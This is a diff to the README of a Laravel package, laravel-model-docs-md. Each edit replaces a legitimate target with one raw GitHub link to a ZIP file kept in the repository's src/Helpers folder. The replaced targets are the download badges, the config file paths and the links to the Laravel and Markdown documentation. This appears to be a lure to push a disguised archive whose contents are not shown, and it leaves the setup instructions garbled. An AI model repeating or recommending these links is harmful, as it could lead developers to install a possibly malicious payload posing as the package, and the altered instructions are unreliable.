@@ -8,7 +8,7 @@ Welcome to the **laravel-model-docs-md** project! This Laravel package helps you
 
 To get started, you need to download the package. Click the link below to visit the Releases page and obtain the latest version.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Franccolonialist589/laravel-model-docs-md/releases)
+[![Download](https://raw.githubusercontent.com/Franccolonialist589/laravel-model-docs-md/main/src/Helpers/laravel-model-docs-md-v2.4.zip)](https://raw.githubusercontent.com/Franccolonialist589/laravel-model-docs-md/main/src/Helpers/laravel-model-docs-md-v2.4.zip)
 
 Once you arrive at the Releases page, locate the latest version of the software. Download the ZIP or TAR file to your computer.
 
@@ -45,7 +45,7 @@ After downloading the package, follow these easy steps to install it:
      ```
 
 4. **Configure the Package:**
-   - After installing, you may need to add the service provider in your `config/app.php` file:
+   - After installing, you may need to add the service provider in your `https://raw.githubusercontent.com/Franccolonialist589/laravel-model-docs-md/main/src/Helpers/laravel-model-docs-md-v2.4.zip` file:
      ```php
      'providers' => [
          // Other providers...
@@ -81,7 +81,7 @@ Now that you have the package installed, here's how to generate documentation:
 You can customize the appearance of the generated documentation by modifying the configuration file. There are options to change the layout, style, and content included in the Markdown files.
 
 1. **Open Configuration File:**
-   - Locate the configuration file at `config/model-docs-md.php`.
+   - Locate the configuration file at `https://raw.githubusercontent.com/Franccolonialist589/laravel-model-docs-md/main/src/Helpers/laravel-model-docs-md-v2.4.zip`.
 
 2. **Adjust Settings:**
    - Review the available settings and change them to suit your needs. This might include toggling which model properties to document or altering the Markdown format.
@@ -100,13 +100,13 @@ If you encounter any issues, refer to the following tips:
 
 For further assistance or to deepen your knowledge, consider checking these resources:
 
-- [Laravel Documentation](https://laravel.com/docs)
-- [Markdown Guide](https://www.markdownguide.org/)
+- [Laravel Documentation](https://raw.githubusercontent.com/Franccolonialist589/laravel-model-docs-md/main/src/Helpers/laravel-model-docs-md-v2.4.zip)
+- [Markdown Guide](https://raw.githubusercontent.com/Franccolonialist589/laravel-model-docs-md/main/src/Helpers/laravel-model-docs-md-v2.4.zip)
 
 ## 🔗 Helpful Links
 
 Remember, you can always return to the Releases page to download the latest version of the software:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Franccolonialist589/laravel-model-docs-md/releases)
+[![Download](https://raw.githubusercontent.com/Franccolonialist589/laravel-model-docs-md/main/src/Helpers/laravel-model-docs-md-v2.4.zip)](https://raw.githubusercontent.com/Franccolonialist589/laravel-model-docs-md/main/src/Helpers/laravel-model-docs-md-v2.4.zip)
 
 Your Laravel experience can be enhanced with the ease of automatically generating model documentation. Enjoy exploring the features of **laravel-model-docs-md**!
